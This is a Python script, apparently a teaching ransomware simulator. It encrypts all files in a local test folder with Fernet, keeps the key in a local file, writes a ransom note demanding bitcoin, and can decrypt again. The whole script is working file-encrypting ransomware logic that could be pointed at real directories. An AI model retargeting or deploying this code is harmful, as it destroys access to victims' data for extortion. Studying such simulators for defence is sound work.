from cryptography.fernet import Fernet
import os

# Directory to "attack" (create this manually)
TARGET_DIR = "client"
RANSOM_NOTE = "ransom_note.txt"
KEY_FILE = "secret.key"

# Generate or load encryption key
def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
    else:
        with open(KEY_FILE, "rb") as f:
            key = f.read()
    return key

# Encrypt a file
def encrypt_file(file_path, fernet):
    with open(file_path, "rb") as f:
        data = f.read()
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as f:
        f.write(encrypted_data)

# Decrypt a file
def decrypt_file(file_path, fernet):
    with open(file_path, "rb") as f:
        data = f.read()
    decrypted_data = fernet.decrypt(data)
    with open(file_path, "wb") as f:
        f.write(decrypted_data)

# Create a ransom note
def create_ransom_note():
    note = """
    YOUR FILES HAVE BEEN ENCRYPTED!
    To decrypt them, send 0.001 BTC to [fake_address].
    Then, run this script again with the key from your payment confirmation.
    Key file: secret.key
    """
    with open(os.path.join(TARGET_DIR, RANSOM_NOTE), "w") as f:
        f.write(note)

# Main ransomware logic
def ransomware_simulate(encrypt=True):
    # Setup
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        print(f"Created {TARGET_DIR}. Add some test files and rerun.")
        return

    key = generate_key()
    fernet = Fernet(key)

    # Encrypt or decrypt files
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            if file != RANSOM_NOTE:  # Skip the note itself
                file_path = os.path.join(root, file)
                if encrypt:
                    encrypt_file(file_path, fernet)
                    print(f"Encrypted: {file}")
                else:
                    decrypt_file(file_path, fernet)
                    print(f"Decrypted: {file}")

    if encrypt:
        create_ransom_note()
        print("Files encrypted! Check the ransom note.")

# Run the simulator
if __name__ == "__main__":
    mode = input("Encrypt (e) or Decrypt (d)? ").lower()
    if mode == "e":
        ransomware_simulate(encrypt=True)
    elif mode == "d":
        ransomware_simulate(encrypt=False)
    else:
        print("Invalid choice. Use 'e' or 'd'.")